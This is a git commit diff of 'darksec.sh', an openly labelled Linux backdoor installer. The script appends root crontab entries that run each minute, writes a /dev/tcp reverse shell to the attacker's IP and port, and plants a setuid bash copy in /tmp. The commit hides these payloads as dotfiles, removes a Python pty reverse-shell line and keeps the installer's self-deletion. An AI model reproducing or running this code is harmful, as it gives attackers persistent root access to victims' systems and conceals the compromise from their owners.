8ed879ef8e5049a96ac376f94d3fdc2f385b22e2
DARKSEC <121623691+DARKSECshell@users.noreply.github.com>
2023-12-22 13:59:43 -0300

    darksec.sh

--- darksec.sh
+++ darksec.sh
@@ -14,8 +14,8 @@ echo '[+] RUNNING BACKDOOR'
 sleep 1
 
 # REVERSE SHELL WITH CRONTAB
-sed -i -e '$i\* * * * * root system.sh' /etc/crontab
-sed -i -e '$i\* * * * * root root.sh' /etc/crontab
+sed -i -e '$i\* * * * * root .system.sh' /etc/crontab
+sed -i -e '$i\* * * * * root .root.sh' /etc/crontab
 sleep 5
 
 # ENTER IN DIRETORY
@@ -23,16 +23,15 @@ cd /usr/local/bin
 sleep 1
 
 # CREATE FILES FOR SHELL REVERSE
-touch system.sh
-echo "#\!/bin/bash" > /usr/local/bin/system.sh
-echo "sh -i >& /dev/tcp/$1/$2 0>&1" >> /usr/local/bin/system.sh # your ip here and your port :)
+touch .system.sh
+echo "#\!/bin/bash" > /usr/local/bin/.system.sh
+echo "sh -i >& /dev/tcp/$1/$2 0>&1" >> /usr/local/bin/.system.sh
 sleep 1
-echo "export RHOST="$1";export RPORT=$2;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")' &" >> /usr/local/bin/system.sh # your ip here and your port :)
-chmod +x /usr/local/bin/system.sh
-touch root.sh
-chmod +x /usr/local/bin/root.sh
-echo "#\!/bin/bash" > /usr/local/bin/root.sh
-echo "cp /bin/bash /tmp/.root && chmod +xs /tmp/.root" >> /usr/local/bin/root.sh
+chmod +x /usr/local/bin/.system.sh
+touch .root.sh
+chmod +x /usr/local/bin/.root.sh
+echo "#\!/bin/bash" > /usr/local/bin/.root.sh
+echo "cp /bin/bash /tmp/.root && chmod +xs /tmp/.root" >> /usr/local/bin/.root.sh
 sleep 1
 
 # BACK FOR  DIRETORY
@@ -40,7 +39,8 @@ cd "$darksec"
 cd ..
 
 # DELETE BACKDOOR
-rm -rf shell_persistent && rm -rf darksec.sh
+rm -rf shell_persistent
+rm -rf darksec.sh
 
 # SUCCESS, BACKDOOR RUNNING
 echo -n '[+] SUCCESS BACKDOOR RUNNING!'
